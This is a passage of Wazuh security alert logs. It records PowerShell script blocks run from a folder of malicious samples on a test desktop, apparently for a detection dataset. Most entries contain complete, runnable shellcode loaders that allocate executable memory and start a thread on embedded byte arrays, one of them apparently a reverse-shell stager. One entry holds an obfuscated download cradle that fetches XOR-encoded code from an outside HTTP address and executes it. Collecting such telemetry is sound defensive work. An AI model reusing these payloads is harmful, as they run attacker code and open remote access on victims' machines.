,0x56,0xb5,0xfc,0x5b,0x3d,0x45,0x01,0x8e,0xa8,0x40,0x95,0x6e,0xda,0x36,0x91,0xf9,0x26,0xc9,0x48,0xa6,0xaf,0x2f,0x3a,0x06,0xe0,0xff,0xfa,0xf6,0x40,0x50,0x92,0x1c,0x4f,0x8f,0x82,0x1e,0x85,0xb8,0x28,0xf1,0x70,0x90,0xc4,0x68,0xd9,0x6a,0x75,0x74,0xf7,0x16,0xb5,0xfe,0xf4,0xe7,0x7b,0xf7,0x71,0xf4,0xeb,0xf7,0xcf,0xa6,0xbd,0x08,0xfa,0xcd,0x41,0x9d,0x01,0x44,0x16,0x09,0x08,0xb1,0x50,0x96,0xf3,0x94,0xeb,0x1f,0x66,0x57,0x83,0x5f,0x66,0x57,0x53,0x36,0xec,0x57,0x3b,0xee,0x54,0x04,0x5e,0xf1,0x40,0x38,0xf3,0x64,0x6b,0x69,0xa0,0x2f,0x03,0x97,0x9f,0x18,0x8c,0x68,0xca,0x98,0xf0,0xbe,0x32,0xef,0x18,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pxl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pxl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pxl,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"86d25d60-ab3d-4c2b-92ae-5b939f347ed9","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3795.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:39.404+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":190,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304499.3988180","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:59.8849955Z","eventRecordID":"145785","processID":"6864","threadID":"4440","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$LCPw = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LCPw -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc1,0xbe,0x91,0x21,0xd8,0x0f,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x75,0x14,0x03,0x75,0x85,0xc3,0x2d,0xf3,0x4d,0x81,0xce,0x0c,0x8d,0xe6,0x47,0xe9,0xbc,0x26,0x33,0x79,0xee,0x96,0x37,0x2f,0x02,0x5c,0x15,0xc4,0x91,0x10,0xb2,0xeb,0x12,0x9e,0xe4,0xc2,0xa3,0xb3,0xd5,0x45,0x27,0xce,0x09,0xa6,0x16,0x01,0x5c,0xa7,0x5f,0x7c,0xad,0xf5,0x08,0x0a,0x00,0xea,0x3d,0x46,0x99,0x81,0x0d,0x46,0x99,0x76,0xc5,0x69,0x88,0x28,0x5e,0x30,0x0a,0xca,0xb3,0x48,0x03,0xd4,0xd0,0x75,0xdd,0x6f,0x22,0x01,0xdc,0xb9,0x7b,0xea,0x73,0x84,0xb4,0x19,0x8d,0xc0,0x72,0xc2,0xf8,0x38,0x81,0x7f,0xfb,0xfe,0xf8,0x5b,0x8e,0xe4,0x5a,0x2f,0x28,0xc1,0x5b,0xfc,0xaf,0x82,0x57,0x49,0xbb,0xcd,0x7b,0x4c,0x68,0x66,0x87,0xc5,0x8f,0xa9,0x0e,0x9d,0xab,0x6d,0x4b,0x45,0xd5,0x34,0x31,0x28,0xea,0x27,0x9a,0x95,0x4e,0x23,0x36,0xc1,0xe2,0x6e,0x5e,0x26,0xcf,0x90,0x9e,0x20,0x58,0xe2,0xac,0xef,0xf2,0x6c,0x9c,0x78,0xdd,0x6b,0xe3,0x52,0x99,0xe4,0x1a,0x5d,0xda,0x2d,0xd8,0x09,0x8a,0x45,0xc9,0x31,0x41,0x96,0xf6,0xe7,0xfc,0x93,0x60,0xc8,0xa9,0x9d,0x73,0xa0,0xab,0x9d,0x72,0x8c,0x25,0x7b,0x24,0xbc,0x65,0xd4,0x84,0x6c,0xc6,0x84,0x6c,0x67,0xc9,0xfb,0x8c,0x88,0x03,0x94,0x26,0x67,0xfa,0xcc,0xde,0x1e,0xa7,0x87,0x7f,0xde,0x7d,0xe2,0xbf,0x54,0x72,0x12,0x71,0x9d,0xff,0x00,0xe5,0x6d,0x4a,0x7a,0xa3,0x72,0x60,0x11,0x4b,0xe7,0x8f,0xb0,0x1c,0x9f,0x8d,0xe5,0x6a,0x00,0x6d,0xc0,0xe1,0x89,0xfb,0xab,0x9d,0xf5,0xeb,0x2b,0x5d,0xa0,0x61,0x2c,0x35,0x14,0xd2,0x7f,0x20,0x5b,0xcf,0x13,0xf9,0xce,0xf0,0x45,0xae,0x59,0x99,0x6b,0x89,0xae,0x06,0x93,0xfc,0x2e,0x7a,0x42,0x38,0x45,0x92,0x56;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$AIjr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($AIjr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$AIjr,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 2577cd62-187e-4840-9bdc-9ae295df7aca\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\380.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$LCPw = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LCPw -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc1,0xbe,0x91,0x21,0xd8,0x0f,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x75,0x14,0x03,0x75,0x85,0xc3,0x2d,0xf3,0x4d,0x81,0xce,0x0c,0x8d,0xe6,0x47,0xe9,0xbc,0x26,0x33,0x79,0xee,0x96,0x37,0x2f,0x02,0x5c,0x15,0xc4,0x91,0x10,0xb2,0xeb,0x12,0x9e,0xe4,0xc2,0xa3,0xb3,0xd5,0x45,0x27,0xce,0x09,0xa6,0x16,0x01,0x5c,0xa7,0x5f,0x7c,0xad,0xf5,0x08,0x0a,0x00,0xea,0x3d,0x46,0x99,0x81,0x0d,0x46,0x99,0x76,0xc5,0x69,0x88,0x28,0x5e,0x30,0x0a,0xca,0xb3,0x48,0x03,0xd4,0xd0,0x75,0xdd,0x6f,0x22,0x01,0xdc,0xb9,0x7b,0xea,0x73,0x84,0xb4,0x19,0x8d,0xc0,0x72,0xc2,0xf8,0x38,0x81,0x7f,0xfb,0xfe,0xf8,0x5b,0x8e,0xe4,0x5a,0x2f,0x28,0xc1,0x5b,0xfc,0xaf,0x82,0x57,0x49,0xbb,0xcd,0x7b,0x4c,0x68,0x66,0x87,0xc5,0x8f,0xa9,0x0e,0x9d,0xab,0x6d,0x4b,0x45,0xd5,0x34,0x31,0x28,0xea,0x27,0x9a,0x95,0x4e,0x23,0x36,0xc1,0xe2,0x6e,0x5e,0x26,0xcf,0x90,0x9e,0x20,0x58,0xe2,0xac,0xef,0xf2,0x6c,0x9c,0x78,0xdd,0x6b,0xe3,0x52,0x99,0xe4,0x1a,0x5d,0xda,0x2d,0xd8,0x09,0x8a,0x45,0xc9,0x31,0x41,0x96,0xf6,0xe7,0xfc,0x93,0x60,0xc8,0xa9,0x9d,0x73,0xa0,0xab,0x9d,0x72,0x8c,0x25,0x7b,0x24,0xbc,0x65,0xd4,0x84,0x6c,0xc6,0x84,0x6c,0x67,0xc9,0xfb,0x8c,0x88,0x03,0x94,0x26,0x67,0xfa,0xcc,0xde,0x1e,0xa7,0x87,0x7f,0xde,0x7d,0xe2,0xbf,0x54,0x72,0x12,0x71,0x9d,0xff,0x00,0xe5,0x6d,0x4a,0x7a,0xa3,0x72,0x60,0x11,0x4b,0xe7,0x8f,0xb0,0x1c,0x9f,0x8d,0xe5,0x6a,0x00,0x6d,0xc0,0xe1,0x89,0xfb,0xab,0x9d,0xf5,0xeb,0x2b,0x5d,0xa0,0x61,0x2c,0x35,0x14,0xd2,0x7f,0x20,0x5b,0xcf,0x13,0xf9,0xce,0xf0,0x45,0xae,0x59,0x99,0x6b,0x89,0xae,0x06,0x93,0xfc,0x2e,0x7a,0x42,0x38,0x45,0x92,0x56;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$AIjr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($AIjr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$AIjr,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"2577cd62-187e-4840-9bdc-9ae295df7aca","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\380.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:40.299+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":191,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304500.3999545","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:00.7206490Z","eventRecordID":"145789","processID":"8444","threadID":"5872","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$tnNG = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $tnNG -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd9,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BuBW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BuBW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BuBW,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 97b00787-03a9-40d0-b620-e07f94f293e7\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3830.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$tnNG = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $tnNG -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd9,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BuBW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BuBW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BuBW,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"97b00787-03a9-40d0-b620-e07f94f293e7","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3830.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:41.654+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":24,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304501.4010554","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:01.4852209Z","eventRecordID":"145793","processID":"8076","threadID":"5564","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=New-OBjeCT SYStEm.Net.WEbCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadERS.ADD('User-Agent',$u);$Wc.PrOXy = [SYSTeM.NEt.WeBReQUEst]::DefAulTWeBProXY;$WC.PrOXY.CredENTials = [SYStEm.NeT.CREdeNTialCACHe]::DefaULTNEtworkCReDEntIalS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[Char[]]$B=([ChAr[]]($wc.DoWNloadStrING(\"http://192.168.118.129:8080/index.asp\")))|%{$_-BXoR$k[$I++%$k.LENgTh]};IEX ($B-JoIn'')\r\n\r\nScriptBlock ID: c9c84143-bb94-414a-b80e-4dbf20a8e1bd\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3832.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=New-OBjeCT SYStEm.Net.WEbCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadERS.ADD('User-Agent',$u);$Wc.PrOXy = [SYSTeM.NEt.WeBReQUEst]::DefAulTWeBProXY;$WC.PrOXY.CredENTials = [SYStEm.NeT.CREdeNTialCACHe]::DefaULTNEtworkCReDEntIalS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[Char[]]$B=([ChAr[]]($wc.DoWNloadStrING(\\\"http://192.168.118.129:8080/index.asp\\\")))|%{$_-BXoR$k[$I++%$k.LENgTh]};IEX ($B-JoIn'')","scriptBlockId":"c9c84143-bb94-414a-b80e-4dbf20a8e1bd","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3832.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:41.755+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":192,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304501.4014356","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:02.2630284Z","eventRecordID":"145797","processID":"8844","threadID":"6276","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$LQ6C = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LQ6C -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc5,0xba,0x56,0x97,0x27,0x96,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x42,0x75,0xd2,0x6a,0x82,0xfb,0x1d,0x93,0x52,0x9c,0x94,0x76,0x63,0x9c,0xc3,0xf3,0xd3,0x2c,0x87,0x56,0xdf,0xc7,0xc5,0x42,0x54,0xa5,0xc1,0x65,0xdd,0x00,0x34,0x4b,0xde,0x39,0x04,0xca,0x5c,0x40,0x59,0x2c,0x5d,0x8b,0xac,0x2d,0x9a,0xf6,0x5d,0x7f,0x73,0x7c,0xf3,0x90,0xf0,0xc8,0xc8,0x1b,0x4a,0xdc,0x48,0xff,0x1a,0xdf,0x79,0xae,0x11,0x86,0x59,0x50,0xf6,0xb2,0xd3,0x4a,0x1b,0xfe,0xaa,0xe1,0xef,0x74,0x2d,0x20,0x3e,0x74,0x82,0x0d,0x8f,0x87,0xda,0x4a,0x37,0x78,0xa9,0xa2,0x44,0x05,0xaa,0x70,0x37,0xd1,0x3f,0x63,0x9f,0x92,0x98,0x4f,0x1e,0x76,0x7e,0x1b,0x2c,0x33,0xf4,0x43,0x30,0xc2,0xd9,0xff,0x4c,0x4f,0xdc,0x2f,0xc5,0x0b,0xfb,0xeb,0x8e,0xc8,0x62,0xad,0x6a,0xbe,0x9b,0xad,0xd5,0x1f,0x3e,0xa5,0xfb,0x74,0x33,0xe4,0x93,0xb9,0x7e,0x17,0x63,0xd6,0x09,0x64,0x51,0x79,0xa2,0xe2,0xd9,0xf2,0x6c,0xf4,0x1e,0x29,0xc8,0x6a,0xe1,0xd2,0x29,0xa2,0x25,0x86,0x79,0xdc,0x8c,0xa7,0x11,0x1c,0x31,0x72,0x8f,0x19,0xa5,0xbd,0xf8,0x22,0x3f,0x56,0xfb,0x22,0x20,0x36,0x72,0xc4,0x0e,0x66,0xd5,0x59,0xee,0xd6,0x95,0x09,0x86,0x3c,0x1a,0x75,0xb6,0x3e,0xf0,0x1e,0x5c,0xd1,0xad,0x77,0xc8,0x48,0xf4,0x0c,0x69,0x94,0x22,0x69,0xa9,0x1e,0xc1,0x8d,0x67,0xd7,0xac,0x9d,0x1f,0x17,0xfb,0xfc,0x89,0x28,0xd1,0x6b,0x35,0xbd,0xde,0x3d,0x62,0x29,0xdd,0x18,0x44,0xf6,0x1e,0x4f,0xdf,0x3f,0x8b,0x30,0xb7,0x3f,0x5b,0xb1,0x47,0x16,0x31,0xb1,0x2f,0xce,0x61,0xe2,0x4a,0x11,0xbc,0x96,0xc7,0x84,0x3f,0xcf,0xb4,0x0f,0x28,0xed,0xe3,0x78,0xf7,0x0e,0xc6,0x78,0xcb,0xd8,0x2e,0x0f,0x25,0xd9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6u5c=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6u5c.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6u5c,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7f0126ac-256e-4be5-b35d-67b92cf216c7\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3845.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$LQ6C = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LQ6C -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc5,0xba,0x56,0x97,0x27,0x96,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x42,0x75,0xd2,0x6a,0x82,0xfb,0x1d,0x93,0x52,0x9c,0x94,0x76,0x63,0x9c,0xc3,0xf3,0xd3,0x2c,0x87,0x56,0xdf,0xc7,0xc5,0x42,0x54,0xa5,0xc1,0x65,0xdd,0x00,0x34,0x4b,0xde,0x39,0x04,0xca,0x5c,0x40,0x59,0x2c,0x5d,0x8b,0xac,0x2d,0x9a,0xf6,0x5d,0x7f,0x73,0x7c,0xf3,0x90,0xf0,0xc8,0xc8,0x1b,0x4a,0xdc,0x48,0xff,0x1a,0xdf,0x79,0xae,0x11,0x86,0x59,0x50,0xf6,0xb2,0xd3,0x4a,0x1b,0xfe,0xaa,0xe1,0xef,0x74,0x2d,0x20,0x3e,0x74,0x82,0x0d,0x8f,0x87,0xda,0x4a,0x37,0x78,0xa9,0xa2,0x44,0x05,0xaa,0x70,0x37,0xd1,0x3f,0x63,0x9f,0x92,0x98,0x4f,0x1e,0x76,0x7e,0x1b,0x2c,0x33,0xf4,0x43,0x30,0xc2,0xd9,0xff,0x4c,0x4f,0xdc,0x2f,0xc5,0x0b,0xfb,0xeb,0x8e,0xc8,0x62,0xad,0x6a,0xbe,0x9b,0xad,0xd5,0x1f,0x3e,0xa5,0xfb,0x74,0x33,0xe4,0x93,0xb9,0x7e,0x17,0x63,0xd6,0x09,0x64,0x51,0x79,0xa2,0xe2,0xd9,0xf2,0x6c,0xf4,0x1e,0x29,0xc8,0x6a,0xe1,0xd2,0x29,0xa2,0x25,0x86,0x79,0xdc,0x8c,0xa7,0x11,0x1c,0x31,0x72,0x8f,0x19,0xa5,0xbd,0xf8,0x22,0x3f,0x56,0xfb,0x22,0x20,0x36,0x72,0xc4,0x0e,0x66,0xd5,0x59,0xee,0xd6,0x95,0x09,0x86,0x3c,0x1a,0x75,0xb6,0x3e,0xf0,0x1e,0x5c,0xd1,0xad,0x77,0xc8,0x48,0xf4,0x0c,0x69,0x94,0x22,0x69,0xa9,0x1e,0xc1,0x8d,0x67,0xd7,0xac,0x9d,0x1f,0x17,0xfb,0xfc,0x89,0x28,0xd1,0x6b,0x35,0xbd,0xde,0x3d,0x62,0x29,0xdd,0x18,0x44,0xf6,0x1e,0x4f,0xdf,0x3f,0x8b,0x30,0xb7,0x3f,0x5b,0xb1,0x47,0x16,0x31,0xb1,0x2f,0xce,0x61,0xe2,0x4a,0x11,0xbc,0x96,0xc7,0x84,0x3f,0xcf,0xb4,0x0f,0x28,0xed,0xe3,0x78,0xf7,0x0e,0xc6,0x78,0xcb,0xd8,0x2e,0x0f,0x25,0xd9;$g = 0x1000;if ($z.Length -gt 